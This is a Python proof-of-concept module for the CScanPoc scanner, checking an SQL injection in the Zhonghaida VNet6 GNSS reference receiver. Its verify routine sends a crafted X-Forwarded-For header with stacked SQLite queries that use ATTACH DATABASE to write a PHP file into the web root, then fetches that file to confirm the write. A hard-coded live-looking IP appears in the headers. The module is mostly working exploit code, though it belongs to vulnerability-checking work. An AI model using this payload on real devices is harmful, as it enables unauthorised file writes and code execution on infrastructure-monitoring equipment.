# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Zhonghaida_0007' # 平台漏洞编号，留空
    name = '中海达设备 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-13'  # 漏洞公布时间
    desc = '''
        该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
        产品是使用SQLite数据库，在该系统中，有一个获取ip信息的函数get_ip()
        只要调用了这个函数，进入sql查询 均可以造成漏洞，通过搜索发现，该系统的多个文件调用了该函数，均可造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
    product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '31fabf1a-58d7-42c7-be9f-f6eaf03d19fa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer     :http://wooyun.org/bugs/wooyun-2015-0140314
            hh = hackhttp.hackhttp()
            arg = self.target
            raw = """
POST /login.php HTTP/1.1
Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
Referer: http://120.202.60.143/
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; .NET CLR 1.1.4322)
Content-Length: 70
Host: 120.202.60.143
X-Forwarded-For: 120.202.60.143/',1,2,3,4,5,6);ATTACH DATABASE '/home/www/apache/htdocs/CSS/223.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php phpinfo();?>');--

usr=guest&psw=guest&action=1&lang=en&redirect=%2Fpages%2Fen%2Fuser.php
            """
            code, head,res, errcode, _ = hh.http(arg + '/login.php', raw=raw)
            code, head,res, errcode, _ = hh.http(arg + '/CSS/223.php')
            if code ==200 and  'phpinfo()' in res:
                #security_hole(arg + 'CSS/223.php')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
